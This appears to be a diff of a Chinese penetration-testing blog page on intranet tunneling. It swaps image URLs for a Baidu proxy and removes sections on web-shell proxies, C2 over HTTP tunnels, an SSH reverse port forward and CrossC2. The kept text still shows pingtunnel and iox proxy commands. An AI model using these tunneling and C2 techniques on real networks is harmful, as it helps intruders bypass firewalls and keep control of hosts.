@@ -13,16 +13,14 @@
 <meta property="og:site_name" content="Ca1m">
 <meta property="og:description" content="SMB-开防火墙入站只445： 可用于文件打印和共享 smb和上面两个icmp和dns不一样，他是为了解决入站问题 SMB一般在防火墙入站默认是开启的，判断目标端口是否开放 适用场景：防火墙放行的入口打不下利用放行的SMB移动获取权限 利用条件：密码喷射或已知口令的情况下直接正向SMB横向移动拿下 大致流程： 域控192.168.3.21 web服务器ip192.168.3.31 sql服务器ip">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740747053037-f1df8b69-266e-4ab7-aef9-33f929da9506.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740747067333-4120b7ec-50e9-46cb-b90b-0bcb5e1b663b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png">
 <meta property="article:published_time" content="2024-10-04T16:51:29.000Z">
-<meta property="article:modified_time" content="2025-03-04T03:40:38.882Z">
+<meta property="article:modified_time" content="2025-03-04T03:56:40.408Z">
 <meta property="article:author" content="Ca1m">
 <meta property="article:tag" content="域">
 <meta property="article:tag" content="隧道">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png">
     
     
       
@@ -126,7 +124,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA445%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">SMB-开防火墙入站只445：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%812%E5%9C%BA%E6%99%AF%E5%90%8E%E7%BB%AD%E7%A9%BF%E9%80%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">1、2场景后续穿透问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8A%E7%BA%BFC2%EF%BC%9A%EF%BC%88%E8%A7%A3%E5%86%B3%E7%9B%AE%E6%A0%87%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%E4%B8%8A%E7%BA%BFC2%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">HTTP隧道搭建上线C2：（解决目标出站限制上线C2）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%9A%EF%BC%88%E8%A7%A3%E5%86%B3%E7%9B%AE%E6%A0%87%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E4%B8%8A%E7%BA%BF-%E6%8F%92%E4%BB%B6-Linux-Mac-IOS-Android"><span class="toc-number">4.1.</span> <span class="toc-text">控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA445%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">SMB-开防火墙入站只445：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%812%E5%9C%BA%E6%99%AF%E5%90%8E%E7%BB%AD%E7%A9%BF%E9%80%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">1、2场景后续穿透问题</span></a></li></ol>
       </div>
     
   </span>
@@ -176,7 +174,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h3 id="SMB-开防火墙入站只445："><a href="#SMB-开防火墙入站只445：" class="headerlink" title="SMB-开防火墙入站只445："></a>SMB-开防火墙入站只445：</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png"></p>
+    <h3 id="SMB-开防火墙入站只445："><a href="#SMB-开防火墙入站只445：" class="headerlink" title="SMB-开防火墙入站只445："></a>SMB-开防火墙入站只445：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png"></p>
 <p>可用于文件打印和共享</p>
 <p>smb和上面两个icmp和dns不一样，他是为了解决入站问题</p>
 <p>SMB一般在防火墙入站默认是开启的，判断目标端口是否开放</p>
@@ -199,64 +197,7 @@
 <p>pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.141 -t 192.168.139.141:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000</p>
 <p>建立SockS节点绑定2222端口：</p>
 <p>iox.exe proxy -r 127.0.0.1:2222</p>
-<p>此时在windows上proxifier可以加载节点配置就可以访问web服务<br><img src="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740747053037-f1df8b69-266e-4ab7-aef9-33f929da9506.png"></p>
-<p>-项目Neo-reGeorg</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
-<p>工具使用：</p>
-<p>1、设置密码生成(aspx|ashx|jsp|jspx|php)并上传</p>
-<p>2、使用neoreg.py连接WEB服务器，在本地建立连接</p>
-<p>3、Proxifier添加socks5服务器并配置连接规则测试</p>
-<p>同类推荐项目：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/zema1/suo5">https://github.com/zema1/suo5</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
-<p>-哥斯拉&amp;冰蝎</p>
-<p>哥斯拉：HttpProxy</p>
-<p>冰蝎：内网穿透</p>
-<h3 id="HTTP隧道搭建上线C2：（解决目标出站限制上线C2）"><a href="#HTTP隧道搭建上线C2：（解决目标出站限制上线C2）" class="headerlink" title="HTTP隧道搭建上线C2：（解决目标出站限制上线C2）"></a>HTTP隧道搭建上线C2：（解决目标出站限制上线C2）</h3><p>太多时候遇到目标不出网了，TCP、ICMP、DNS协议均不通，</p>
-<p>无法直接与公网的CS&#x2F;MSF&#x2F;Sliverd等其他C2服务端建立连接。</p>
-<p>1、内网穿透建立HTTP隧道穿透</p>
-<p>2、将远程IP正向后门端口转发本地端口</p>
-<p>3、CS生成绑定正向后门，连接本地端口</p>
-<h3 id="SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）"><a href="#SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）" class="headerlink" title="SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）"></a>SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/25663185/1740747067333-4120b7ec-50e9-46cb-b90b-0bcb5e1b663b.png"></p>
-<p>注：由于CS无SSH协议监听器配置，无法上线</p>
-<p>1、环境复现搭建：</p>
-<p>如：模拟Linux为被控机，配置防火墙策略</p>
-<p>iptables -F &#x2F;* 清除所有规则 *&#x2F;</p>
-<p>iptables -AINPUT -p tcp –dport 22 -j ACCEPT &#x2F;<em>允许包从22端口进入</em>&#x2F;</p>
-<p>iptables -AOUTPUT -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT &#x2F;<em>允许从22端口进入的包返回</em>&#x2F;</p>
-<p>iptables -AOUTPUT -p udp –dport 53 -j ACCEPT &#x2F;* 域名解析端口，一般不开 *&#x2F;</p>
-<p>iptables -AINPUT -p udp –sport 53 -j ACCEPT &#x2F;* 域名解析端口，一般不开 *&#x2F;</p>
-<p>iptables -AINPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT &#x2F;<em>允许本机访问本机</em>&#x2F;</p>
-<p>iptables -AOUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</p>
-<p>iptables -AINPUT -p tcp -s 0&#x2F;0 –dport 80 -j ACCEPT &#x2F;<em>允许所有IP访问80端口</em>&#x2F;</p>
-<p>iptables -AOUTPUT -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT</p>
-<p>iptables-save &gt; &#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;<em>保存配置</em>&#x2F;</p>
-<p>iptables -L &#x2F;* 显示iptables列表 *&#x2F;</p>
-<p>如：模拟Windows为被控机，配置防火墙策略：SSH22端口放行</p>
-<p>自己的服务器记得开启ssh协议登录：</p>
-<p>vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
-<p>PermitRootLogin yes</p>
-<p>PasswordAuthentication yes</p>
-<p>&#x2F;etc&#x2F;init.d&#x2F;ssh start</p>
-<p>&#x2F;etc&#x2F;init.d&#x2F;ssh restart</p>
-<p>2、适用场景：</p>
-<p>内网主机防火墙限制了出网协议，可以利用SSH转发流量实现内网穿透</p>
-<p>3、需要条件：（解决目标出站限制）</p>
-<p>被控主机需支持SSH协议（Windows需要安装支持软件）</p>
-<p>将2.22上80端口流量转发到xx.xx上的1234端口</p>
-<p>ssh -CfNg -R1234:192.168.2.22:80 <a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#x78;&#120;&#46;&#x78;&#120;&#x2e;&#x78;&#120;&#x2e;&#120;&#120;">&#114;&#111;&#111;&#116;&#x40;&#x78;&#120;&#46;&#x78;&#120;&#x2e;&#x78;&#120;&#x2e;&#120;&#120;</a></p>
-<p>curL <a target="_blank" rel="noopener" href="http://127.0.0.1:1234/">http://127.0.0.1:1234</a></p>
-<h4 id="控制上线-插件-Linux-Mac-IOS-Android"><a href="#控制上线-插件-Linux-Mac-IOS-Android" class="headerlink" title="控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android"></a>控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</h4><p><a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
-<p>面向Linux Mac IOS Android系统上线支持</p>
-<p>1、插件使用</p>
-<p>2、命令使用</p>
-<p>使用参考：</p>
-<p><a target="_blank" rel="noopener" href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a></p>
-<p>目前版本只支持反向的https和正向的tcp</p>
-<p>1、下载对应版本加载器和CNA插件</p>
-<p>2、上传加载器文件和本地加载CNA插件</p>
-<p>3、修改CNA插件配置路径及上传Key文件</p>
-<p>4、使用命令或插件绑定HTTPS监听器生成</p>
+<p>此时在windows上proxifier可以加载节点配置就可以访问web服务</p>
 
   </div>
 </article>
@@ -302,7 +243,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA445%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">SMB-开防火墙入站只445：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%812%E5%9C%BA%E6%99%AF%E5%90%8E%E7%BB%AD%E7%A9%BF%E9%80%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">1、2场景后续穿透问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E4%B8%8A%E7%BA%BFC2%EF%BC%9A%EF%BC%88%E8%A7%A3%E5%86%B3%E7%9B%AE%E6%A0%87%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%E4%B8%8A%E7%BA%BFC2%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">HTTP隧道搭建上线C2：（解决目标出站限制上线C2）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%EF%BC%9A%EF%BC%88%E8%A7%A3%E5%86%B3%E7%9B%AE%E6%A0%87%E5%87%BA%E7%AB%99%E9%99%90%E5%88%B6%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">SSH隧道搭建内网穿透：（解决目标出站限制做信息收集）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E4%B8%8A%E7%BA%BF-%E6%8F%92%E4%BB%B6-Linux-Mac-IOS-Android"><span class="toc-number">4.1.</span> <span class="toc-text">控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%A5%E7%AB%99%E5%8F%AA445%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">SMB-开防火墙入站只445：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%812%E5%9C%BA%E6%99%AF%E5%90%8E%E7%BB%AD%E7%A9%BF%E9%80%8F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">1、2场景后续穿透问题</span></a></li></ol>
       </div>
     
 
